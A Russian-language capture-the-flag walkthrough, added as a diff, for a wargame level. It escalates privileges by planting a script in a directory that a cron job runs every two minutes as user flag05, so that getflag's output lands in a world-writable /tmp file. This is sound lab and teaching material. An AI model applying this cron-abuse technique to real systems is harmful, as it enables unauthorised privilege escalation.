@@ -1,0 +1,32 @@
+когда зайдем по пользователем level05 увидим сообщения 
+```
+You have new mail in /var/mail/level05
+```
+помотрев файл 
+```
+>cat /var/mail/level05
+```
+увидим что запущено крон задание каждые 2 минуты запускается bash скрипт
+```
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+```
+посмотрев что в скрипте поймём что он запускат все файлы в деректории /opt/openarenaserver/ и удаляет эти скрипты
+```
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+        (ulimit -t 5; bash -x "$i")
+        rm -f "$i"
+done
+```
+создадим файл flag для записи и дадим правами
+```
+>touch /tmp/flag
+>chmod 777 /tmp/flag
+````
+После создадим скрипт в /opt/openarenaserver/getFlag.sh который запишит результат getflag в /tmp/flag
+```
+>echo '#!/bin/sh
+getflag > /tmp/flag' > /opt/openarenaserver/getFlag.sh
+```
+В течение 2 минут отработает cron и посмотрев /tmp/flag в увидим следуйщиё флаг
